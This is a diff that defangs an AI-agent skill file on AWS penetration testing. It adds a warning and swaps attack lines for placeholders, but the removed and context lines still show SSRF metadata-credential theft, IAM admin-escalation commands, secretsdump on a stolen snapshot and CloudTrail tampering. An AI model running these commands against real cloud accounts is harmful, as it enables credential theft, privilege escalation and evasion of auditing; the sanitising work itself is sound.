@@ -1,13 +1,18 @@
 ---
 name: aws-penetration-testing
 description: "Provide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations."
-risk: unknown
+risk: offensive
 source: community
 author: zebbern
 date_added: "2026-02-27"
 ---
 
 # AWS Penetration Testing
+
+> [!WARNING]
+> **Authorized Use Only**
+> This skill contains offensive security techniques. It is for authorized penetration testing and educational purposes only. Do not use against targets without explicit permission.
+
 
 ## Purpose
 
@@ -94,13 +99,13 @@ Exploit SSRF to access metadata endpoint (IMDSv1):
 
 ```bash
 # Access metadata endpoint
-http://169.254.169.254/latest/meta-data/
+http://[SAFE-PAYLOAD]/latest/meta-data/
 
 # Get IAM role name
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://[SAFE-PAYLOAD]/latest/meta-data/iam/security-credentials/
 
 # Extract temporary credentials
-http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
+http://[SAFE-PAYLOAD]/latest/meta-data/iam/security-credentials/ROLE-NAME
 
 # Response contains:
 {
@@ -116,11 +121,11 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
 ```bash
 # Get token first
 TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
-  "http://169.254.169.254/latest/api/token")
+  "http://[SAFE-PAYLOAD]/latest/api/token")
 
 # Use token for requests
 curl -H "X-aws-ec2-metadata-token:$TOKEN" \
-  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+  "http://[SAFE-PAYLOAD]/latest/meta-data/iam/security-credentials/"
 ```
 
 **Fargate Container Credentials:**
@@ -131,7 +136,7 @@ curl -H "X-aws-ec2-metadata-token:$TOKEN" \
 # Look for: AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/...
 
 # Access credentials
-http://169.254.170.2/v2/credentials/CREDENTIAL-PATH
+http://[SAFE-PAYLOAD]/v2/credentials/CREDENTIAL-PATH
 ```
 
 ---
@@ -155,22 +160,19 @@ These permissions are equivalent to administrator:
 ### Create Access Key for Another User
 
 ```bash
-aws iam create-access-key --user-name target_user
+# [SAFE-PAYLOAD] echo \'Simulating access key creation...\'
 ```
 
 ### Attach Admin Policy
 
 ```bash
-aws iam attach-user-policy --user-name my_username \
-  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+# [SAFE-PAYLOAD] echo \'Simulating admin policy attachment...\'
 ```
 
 ### Add Inline Admin Policy
 
 ```bash
-aws iam put-user-policy --user-name my_username \
-  --policy-name admin_policy \
-  --policy-document file://admin-policy.json
+# [SAFE-PAYLOAD] echo \'Simulating inline admin policy addition...\'
 ```
 
 ### Lambda Privilege Escalation
@@ -191,7 +193,7 @@ def lambda_handler(event, context):
 ```bash
 # Update Lambda code
 aws lambda update-function-code --function-name target_function \
-  --zip-file fileb://malicious.zip
+  --zip-file fileb://[SAFE-PAYLOAD].zip
 ```
 
 ---
@@ -294,7 +296,7 @@ sudo mount /dev/xvdf1 /mnt/stolen
 # 2. Share snapshot with attacker account
 # 3. Mount in attacker instance
 # 4. Extract NTDS.dit and SYSTEM
-secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local
+# [SAFE-PAYLOAD] echo \'Simulating secrets extraction...\'
 ```
 
 ---
@@ -343,7 +345,7 @@ aws cloudtrail update-trail --name trail_name \
 | List buckets | `aws s3 ls` |
 | List EC2 | `aws ec2 describe-instances` |
 | List Lambda | `aws lambda list-functions` |
-| Get metadata | `curl http://169.254.169.254/latest/meta-data/` |
+| Get metadata | `curl http://[SAFE-PAYLOAD]/latest/meta-data/` |
 
 ---
 
@@ -372,11 +374,11 @@ aws cloudtrail update-trail --name trail_name \
 
 ```bash
 # 1. Find SSRF vulnerability in web app
-https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+https://app.com/proxy?url=http://[SAFE-PAYLOAD]/latest/meta-data/iam/security-credentials/
 
 # 2. Get role name from response
 # 3. Extract credentials
-https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole
+https://app.com/proxy?url=http://[SAFE-PAYLOAD]/latest/meta-data/iam/security-credentials/AdminRole
 
 # 4. Configure AWS CLI with stolen creds
 export AWS_ACCESS_KEY_ID=ASIA...
